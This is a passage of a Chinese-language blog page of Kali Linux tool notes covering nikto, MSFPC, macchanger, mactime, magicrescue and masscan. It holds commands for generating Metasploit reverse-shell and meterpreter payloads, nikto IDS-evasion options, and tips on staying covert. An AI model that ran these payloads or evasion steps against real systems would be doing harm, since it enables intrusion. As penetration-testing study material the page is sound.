class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>•-Cgidirs<br><br>　　扫描CGI目录。<br><br><br>•-config<br><br>　　使用指定的config文件来替代安装在本地的config.txt文件<br><br><br>•-dbcheck<br><br>　选择语法错误的扫描数据库。<br><br><br>•-evasion<br><br><br>使用LibWhisker中对IDS的躲避技术，可使用以下几种类型：<br><br>　　1. 随机URL编码(非UTF-8方式)<br><br>　　2. 自选择路径(/./)<br><br>　　3. 虚假的请求结束<br><br>　　4. 长的URL请求<br><br>　　5. 参数隐藏<br><br>　　6. 使用TAB作为命令的分隔符<br><br>　　7. 大小写敏感<br><br>　　8. 使用Windows路径分隔符\替换/<br><br>　　9. 会话重组<br><br>•-findonly<br><br>　　仅用来发现HTTP和HTTPS端口，而不执行检测规则<br><br><br>•-Format<br><br>　　指定检测报告输出文件的格式，默认是txt文件格式(csv/txt/htm)<br><br><br>•-host<br><br>　　目标主机，主机名、IP地址、主机列表文件。<br><br><br>•-<span class="hljs-built_in">id</span><br><br>　　ID和密码对于授权的HTTP认证。格式：<span class="hljs-built_in">id</span>:password<br><br><br>•-mutate<br><br>　　变化猜测技术<br><br>　　1.使用所有的root目录测试所有文件<br><br>　　2.猜测密码文件名字<br><br>　　3.列举Apache的用户名字(/~user)<br><br>　　4.列举cgiwrap的用户名字(/cgi-bin/cgiwrap/~user)<br><br><br>•-nolookup<br><br>　　不执行主机名查找<br><br><br>•-output<br><br>　　报告输出指定地点<br><br><br>•-port<br><br>　　扫描端口指定，默认为80端口。<br><br><br>•-Pause<br><br>　　每次操作之间的延迟时间<br><br><br>•-Display<br><br>　　控制Nikto输出的显示<br><br>　　1.直接显示信息<br><br>　　2.显示的cookies信息<br><br>　　3.显示所有200/OK的反应<br><br>　　4.显示认证请求的URLs<br><br>　　5.Debug输出<br><br><br>•-ssl<br><br>　　强制在端口上使用SSL模式<br><br><br>•-Single<br><br>　　执行单个对目标服务的请求操作。<br><br><br>•-<span class="hljs-built_in">timeout</span><br><br>　　每个请求的超时时间，默认为10秒<br><br><br>•-Tuning<br><br>　　Tuning 选项控制Nikto使用不同的方式来扫描目标。<br><br>　　0.文件上传<br><br>　　1.日志文件<br><br>　　2.默认的文件<br><br>　　3.信息泄漏<br><br>　　4.注射(XSS/Script/HTML)<br><br>　　5.远程文件检索(Web 目录中)<br><br>　　6.拒绝服务<br><br>　　7.远程文件检索(服务器)<br><br>　　8.代码执行-远程shell<br><br>　　9.SQL注入<br><br>　　a.认证绕过<br><br>　　b.软件关联<br><br>　　g.属性(不要依懒banner的信息)<br><br>　　x.反向连接选项<br><br><br>•-useproxy<br><br>　　使用指定代理扫描<br><br><br>•-update<br><br>　　更新插件和数据库<br><br></code></pre></td></tr></table></figure><h3 id="例子-2"><a href="#例子-2" class="headerlink" title="例子:"></a>例子:</h3><p>nikto -up-date  #升级</p><p>-h 指定扫描的目标 -p 指定扫描的端口(可多个)  -C 选项指定CGI目录 -C all 进行暴力猜解cgi 目录，并进行扫描。</p><p>nikto -h <a href="http://www.google.com/">www.google.com</a> -p 80,81,8080 -C</p><p>nikto -h <a href="http://www.google.com/">www.google.com</a> -C all</p><p>-c &#x2F;admin   #指定目录扫描 cgi扫描只能放到最后</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204122344342.png" alt="image-20220412234454221"></p><p>nikto -h <a href="http://www.google.com/">www.google.com</a>　-o result.txt    #-o 报存扫描结果</p><p>nikto -h <a href="http://www.google.com/">www.google.com</a> -T 49  </p><p># -T 指定扫描类型 包含了一些小的选项</p><p>-T 隐藏选项如下：</p><p>0.文件上传<br>1.日志文件<br>2.默认的文件<br>3.信息泄漏<br>4.注射(XSS&#x2F;Script&#x2F;HTML)<br>5.远程文件检索(Web 目录中)<br>6.拒绝服务<br>7.远程文件检索(服务器)<br>8.代码执行-远程shell<br>9.SQL注入<br>a.认证绕过<br>b.软件关联<br>g.属性(不要依懒banner的信息)<br>x.反向连接选项</p><p>nikto –h <a href="http://www.google.com/">www.google.com</a> -e 13    </p><p> # -e 一个大的选项 ，该选项能够对扫描包进行一些变形，绕过IDC检测。</p><p>-e 详细选项：</p><p>1 进行随机url编码</p><p>2 使用相对路径参照 (&#x2F; .&#x2F;)</p><p>3 尽可能早的结束url访问</p><p>4 使用长随机字符串</p><p>5 隐藏参数</p><p>6 使用TAB作为命令的分隔符号</p><p>7 更改URL大小写</p><p>8 使用windows 路径分隔符 \</p><p>A 使用回车 (0x0d) 作为请求间隔</p><p>B 使用二进制(0x0b) 最为请求间隔</p><p>nikto –h <a href="http://www.google.com/">www.google.com</a> -D 23 </p><p># -D 控制nikto的输出方式 也具有一些小选项：</p><p>1 直接显示信息</p><p>2 显示cookie信息</p><p>3 显示所有 200 &#x2F;OK 的响应</p><p>4 显示需要认证的URL</p><p>D Debug输出</p><p>V 详细输出</p><p>nikto –h <a href="http://www.google.com/">www.google.com</a> -F html -o test.html </p><p>两个参数一般同时出现，-F指定保存结果文件的类型 -o为结果文件名称</p><p>-Single 可以指定HTTP协议内容进行访问</p><p>nikto -Single 进入后会提示输入很多内容，不输入的话工具有默认选项。括号中的就是默认值。</p><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>比较知名 直接看教程</p><p><a href="https://nmap.org/man/zh/man-examples.html">https://nmap.org/man/zh/man-examples.html</a></p><h1 id="M"><a href="#M" class="headerlink" title="M"></a>M</h1><h2 id="metasploit-framework"><a href="#metasploit-framework" class="headerlink" title="metasploit framework"></a>metasploit framework</h2><p>比较知名</p><p>直接看教程</p><p><a href="https://blog.csdn.net/weixin_45677145/article/details/111540117">https://blog.csdn.net/weixin_45677145/article/details/111540117</a></p><h2 id="msf-payload-creater"><a href="#msf-payload-creater" class="headerlink" title="msf payload creater"></a>msf payload creater</h2><h3 id="描述：-35"><a href="#描述：-35" class="headerlink" title="描述："></a>描述：</h3><p>简称msfpc</p><p>MSFvenom Payload Creator（MSFPC）是一个使用起来十分方便的payload生成器，可以根据用户的选择来生成Metasploit的各种payload。有了它，我们就不需要使用的长长的msfvenom命令来产生payload，从而大大的节省了使用者的时间和精力。</p><p>MSFPC只是一个单纯的bash脚本</p><h3 id="参数：-25"><a href="#参数：-25" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ASN.1">l TYPE:MSFPC中支持的payload类型如上图所示，可以分别指定为APK [android], ASP, ASPX, Bash [.sh], Java [.jsp], Linux [.elf], OSX [.macho], Perl [.pl], PHP, Powershell [.ps1], python [.py], Tomcat [.war], Windows [.exe //.dll]等。这个选项相当于msfvenom中的-f参数。<br><br>l DOMAIN/IP:这个选项相当于msfvenom中的LHOST参数。也就是主控端的IP地址。<br><br>l PORT：这个选项相当于msfvenom中的LPORT参数。也就是主控端的端口。<br><br>l CMD/MSF: 这个选项决定了当payload执行后，我们将以何种形式来控制目标系统。比如我们想使用标准的命令行来控制目标时，就可以使用CMD选项。如果目标系统是windows，我们就可以使用如下图所示的cmd命令行方式来控制目标。而如果目标是Linux操作系统，我们则使用 /bin/bash的方式来控制目标。<br></code></pre></td></tr></table></figure><h3 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h3><p>下面我们使用MSFPC来创建一个payload，使用的命令如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ msfpc cmd windows eth0<br></code></pre></td></tr></table></figure><p>成功执行这条命令之后将会产生一个payload，它将会允许你通过使用CMD命令行的方式来控制目标，主控端的IP地址通过eth0设置成了当前kali主机的IP地址。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132010937.png" alt="image-20220413201034824"></p><p>从图中可以看出来，这条命令一共产生了两个文件：</p><p>l 可执行payload文件: windows-shell-staged-reverse-tcp-443.exe</p><p>l Rc文件: windows-shell-staged-reverse-tcp-443-exe.rc</p><p>这两个文件的命名很容易理解，它们是根据创建时使用的选项命名的。我们刚刚创建的可执行payload文件一旦在目标系统中运行起来，它就会连接到主控端的443端口（反向连接），此时我们就可以利用命令提示符shell来控制目标了。我们在创建payload文件的时候，尽量选择使用reverse（反向）来代替bind（正向）。</p><h3 id="资源文件（Resource-file，rc）"><a href="#资源文件（Resource-file，rc）" class="headerlink" title="资源文件（Resource file，rc）"></a>资源文件（Resource file，rc）</h3><p>按照Metasploit官方的解释，资源文件可以帮你自动化的完成一些重复任务。实际上，资源文件就像是批处理脚本，它里面是一组命令。当你在Metasploit中加载这个脚本时，这些命令就会按照顺序执行。你可以将一系列Metasploit控制命令连接在一起来创建资源文件。</p><p>下面我们可以使用cat来查看刚刚生成的rc文件：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132012066.png" alt="image-20220413201253930"></p><p>这里使用的payload选择的参数是cmd，对应的类型是windows&#x2F;shell&#x2F;reverse_tcp 。</p><p>如果你希望获得更方便的控制权限（就像meterpreter中那样），这时就可以使用msf参数，例如：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">msfpc</span> msf windows eth0<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132014048.png" alt="image-20220413201428693"></p><p>在使用msf选项之后，我们查看从MSFPC生成的资源文件，就会两次在“set payload”时的差异：<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132015206.png" alt="image-20220413201555104"></p><p>这时的payload已经被设置为了 windows&#x2F;meterpreter&#x2F;reverse_tcp。写好的资源文件可以使用msfconsole来执行，执行的命令如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole -q -r <span class="hljs-string">&#x27;/home/cdxiaodong/windows-meterpreter-staged-reverse-tcp-443-exe.rc&#x27;</span><br></code></pre></td></tr></table></figure><p>这里面的-q表示使用静默模式（你将看不到metasploit的执行过程），-r表示执行资源文件。不使用参数-q则可以看到如下所示的metasploit调用过程。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132017261.png" alt="image-20220413201714133"></p><p>我们在这个实例中使用的payload是基于x86的，但目标系统是给予x64体系结构。我们建议使用的payload要与操作系统的体系结构相匹配。在Metasploit中，我们可以从基于x86的进程迁移到基于x64的进程上，也可以使用Metasploit post模块post&#x2F;windows&#x2F;manage&#x2F;archmigrate。</p><p>l BIND&#x2F;REVERSE: 目标系统上执行payload后与主控端建立的连接类型。</p><p>l BIND: 将打开目标系统上的一个端口，我们可以使用主控端连接到该端口。这种方式成功的几率并不大，因为目标系统的防火墙规则往往会阻止我们连接到它的端口。</p><p>当我们使用下面的命令：</p><p>msfpc bind msf windows eth0</p><p>就可以生成一个正向的payload。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132018105.png" alt="image-20220413201809985"></p><p>我们查看生成的资源文件可以看到使用windows&#x2F;meterpreter&#x2F;bind_tcp代替了reverse_tcp,</p><p>l REVERSE（反向）: 这个payload会在攻击者主控端的计算机上打开一个端口，一旦payload在目标设备上执行，就会从目标设备上主动回连主控端。这种连接叫做反向连接，它是绕过入口防火墙的一种非常好的方法，但如果出口（出站）防火墙规则禁止了连接，则可以阻止反向连接。默认情况下，MSFPC将使用REVERSE方式来生成payload。</p><p>l STAGED&#x2F;STAGELESS: payload所使用的类型。</p><p>l STAGED: 这个参数会将payload分成多个阶段发送，这样做的好处是可以有效降低payload的大小，默认情况下，MSFPC生成的就是这种多个阶段发送的payload</p><p>l STAGELESS:这个参数会产生一个完整的payload，比多个阶段发送的payload更稳定、更可靠，但与分级payload相比，这种payload太大了。</p><p> msfpc cmd stageless bind windows eth0</p><p>我们查看生成的这个命令生成的资源文件。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132020666.png" alt="image-20220413202041551"></p><p>可以看到这里面payload被设置为windows&#x2F;shell_bind_tcp，这是一个stageless类型的payload，它对应着Metasploit中的windows&#x2F;shell&#x2F;bind_tcp。</p><p>l TCP&#x2F;HTTP&#x2F;HTTPS&#x2F;FIND_PORT: payload与handler通信所使用的方法。</p><p>l TCP：这是在目标服务器上执行payload后的标准通信方法。这种通信方法可以用于任何类型的payload格式，但由于其不加密的性质，很容易被IDS检测到并被防火墙和IPS阻止。</p><p>l HTTP：如果MSFPC使用此选项，则payload将使用HTTP作为通信方法。payload将在端口80上通信。如果目标系统上只有端口80打开，则可以使用此选项绕过防火墙。由于其未加密的性质，很容易被IDS和IPS检测到。</p><p>l HTTPS：此选项用于生成将使用SSL通信的payload。如果需要隐秘的进行反向连接时，建议使用此选项。</p><p>l FIND_PORT：当无法从公共端口（80、443、53、21）获得反向连接时，使用此选项。如果设置了此选项，MSFPC生成的payloa将尝试所有1-65535端口进行通信。</p><p>l BATCH Mode: 在批处理模式下，MSFPC可以使用尽可能多的类型组合生成多个payload。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132030753.png" alt="image-20220413203022607"></p><p>MSFPC会为Windows生成所有组合的payload以及它们各自的资源文件（.rc）</p><p>l LOOP Mode: 这种模式会产生各种类型的多重payload，MSFPC还可以生成给定LHOST的所有payload。当我们不了解目标平台操作系统的类型时，这一点非常有用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfpc  loop 192.168.157.170<br></code></pre></td></tr></table></figure><p>下面是该命令所生成的payload与资源文件。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132031344.png" alt="image-20220413203110198"></p><p>l VERBOSE: 如果要获取有关MSFPC在生成payload时使用的值的更多信息，可以使用此选项。</p><p> msfpc cmd stageless bind windows eth0 verbose</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132031142.png" alt="image-20220413203137962"></p><h2 id="macchanger"><a href="#macchanger" class="headerlink" title="macchanger"></a>macchanger</h2><h3 id="描述：-36"><a href="#描述：-36" class="headerlink" title="描述："></a>描述：</h3><p>macchanger是一个改变电脑网卡MAC地址的程序，可以将自己电脑的mac隐藏起来，提高了自己的安全性。</p><h3 id="实例-4"><a href="#实例-4" class="headerlink" title="实例:"></a>实例:</h3><p>查看自己电脑网卡的mac地址<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132037366.png" alt="image-20220413203715260"></p><p>随机生成mac地址，-r表示生成完全随机的地址，-a表示类型相同但是厂家随机的地址，-A表示任意类型的随机厂家地址。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132038771.png" alt="image-20220413203811288"></p><p>不改变厂家字节生成随机地址</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132038387.png" alt="image-20220413203848283"></p><p>列出所有已知的厂家的三个字节</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132039266.png" alt="image-20220413203920120"></p><h2 id="mactime-sleuthkit"><a href="#mactime-sleuthkit" class="headerlink" title="mactime(-sleuthkit)"></a>mactime(-sleuthkit)</h2><h3 id="描述：-37"><a href="#描述：-37" class="headerlink" title="描述："></a>描述：</h3><p>创建文件活动的ASCII时间线。<br>  mactime根据’-b’或<a href="https://so.csdn.net/so/search?q=STDIN&spm=1001.2101.3001.7020">STDIN</a>指定的主体文件创建文件活动的ASCII时间线。 时间线将写入STDOUT。 主体文件必须采用由’ils -m’，’fls -m’或mac-robber工具创建的时间机器格式。</p><h3 id="参数：-26"><a href="#参数：-26" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">-b body<br>指定主体文件的位置。 该文件必须由诸如“ fls -m”或“ ils -m”之类的工具生成。 <span class="hljs-string">&#x27;mac-robber&#x27;</span>和<span class="hljs-string">&#x27;grave-robber&#x27;</span>工具也可以用来生成文件。<br><br>-g group file<br>指定组文件的位置。 如果给出了，mactime将显示组名而不是GID。<br><br>-p password file<br>指定passwd文件的位置。 mactime将显示用户名，而不是给出的UID。<br><br>-i day|hour index file<br>指定要写入的索引文件的位置。 第一个参数指定粒度，可以是每小时摘要或每天。 如果给出<span class="hljs-string">&#x27;-d&#x27;</span>标志，则摘要将以<span class="hljs-string">&#x27;，&#x27;</span>分隔，以导入电子表格。<br><br>-d<br>以逗号分隔的格式显示时间轴和索引文件，用于将数据导入到电子表格中以进行演示或图形显示。<br><br>-h<br>显示有关会话的标题信息，包括时间范围，输入源以及passwd或组文件。<br><br>-V<br>显示版本信息<br><br>-m<br>月份以数字而不是名称给出（不适用于-y）。<br><br>-y<br>日期以ISO8601格式显示。<br><br>-z TIME_ZONE<br>收集数据的时区。 此参数的名称取决于系统（示例包括EST5EDT，GMT + 1）。 不适用于-y。<br><br>-z list<br>列出有效的时区。<br><br>日期范围<br>要作为时间表的日期范围。 标准格式为yyyy-mm-dd，表示开始日期，没有结束日期。 对于结束日期，请使用yyyy-mm-dd..yyyy-mm-dd。 日期可以包含时间，请使用格式yyyy-mm-ddThh：mm：ss作为开始和/或结束日期。<br><br></code></pre></td></tr></table></figure><h2 id="magicrescue"><a href="#magicrescue" class="headerlink" title="magicrescue"></a>magicrescue</h2><h3 id="描述：-38"><a href="#描述：-38" class="headerlink" title="描述："></a>描述：</h3><p>设备的扫描件，通过查看魔术字节来提取已知的文件类型。读取魔术打开救援设备，扫描他们的文件类型(知道如何恢复)，并调用外部应用程序提取他们。它检查文件内容中的“魔术字节”，所以它可以用来删除实用程序，也可以用来恢复损坏的驱动器或分区。它可以在任何文件系统上工作，但在文件系统上非常分散的地方，它可以恢复每个文件的第一个块。然而，这些块有时高达50 mb。要调用magicrescue，你必须指定至少一个设备和-d -r选项。</p><h3 id="参数：-27"><a href="#参数：-27" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">-b blocksize<br>默认值：1。这将指示magicrescue仅考虑以blocksize参数的倍数开头的文件。 该选项仅适用于其后的方法，因此通过多次指定该选项，可以将其用于不同配方的不同行为。<br>使用此选项通常可以获得更好的性能，但是将发现更少的文件。 特别是，带有前导垃圾的文件（例如许多mp3文件）和其他文件中包含的文件可能会被跳过。 而且，某些文件系统不会将小文件对齐以限制边界，因此也不会以这种方式找到它们。<br>如果您不知道文件系统的块大小，请使用值512，该值几乎总是硬件扇区的大小。<br><br>-d directory<br>必选 找到文件的输出目录。 确保此目录中有足够的可用空间，尤其是在提取非常常见的文件类型（例如jpeg或gzip文件）时。 还要确保文件系统能够在一个目录中处理数千个文件，即，如果要提取许多文件，请不要使用FAT。<br>您不应该将输出目录放在试图从其中抢救文件的同一块设备上。这可能会在当前读取位置之前将相同的文件添加到块设备中，导致magicrescue稍后再次查找相同的文件。<br></code></pre></td></tr></table></figure><h2 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h2><h3 id="描述：-39"><a href="#描述：-39" class="headerlink" title="描述："></a>描述：</h3><p>Masscan，是 robertdavidgraham 在 Github 上开源的端口扫描工具，项目代码位于 <a href="https://github.com/robertdavidgraham/masscan%EF%BC%8C%E7%9B%AE%E5%89%8D%E7%89%88%E6%9C%AC%E4%B8%BA">https://github.com/robertdavidgraham/masscan，目前版本为</a> 1.0.5。</p><p>Masscan 性能优越，极限速度可以从单机每秒发送1000万个数据包。Masscan 使用了与另一个著名的扫描工具 —— nmap 类似的命令行参数，方便进行上手使用。</p><p>Masscan 针对 TCP 端口进行扫描，使用 SYN 扫描的方式，不建立一个完全的 TCP 连接，而是首先发送一个 SYN 数据包到目标端口，然后等待接收。如果接收到 SYN-ACK 包，则说明该端口是开放的，此时发送一个 RST 结束建立过程即可；否则，若目标返回 RST，则端口不开放。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132105899.png" alt="image-20220413210531780"></p><p>Masscan 在其内部使用异步传输，更为灵活，允许任意的IP和端口范围，并使用了随机化的目标扫描，使得对于非连续段IP的扫描更加高效，解决了范围切分带来的性能损失问题，且降低了对于目标网络的负载压力，提高了自由度和性能</p><h3 id="参数：-28"><a href="#参数：-28" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><code class="hljs bash">•&lt;ip / range&gt;：假定命令行上没有前缀“-”的任何内容<br>           是IP地址或范围。有三种有效格式。首先是<br>           单个IPv4地址，例如“ 192.168.0.1”。第二个范围是<br>           “ 10.0.0.1-10.0.0.100”。第三个是CIDR地址，例如“ 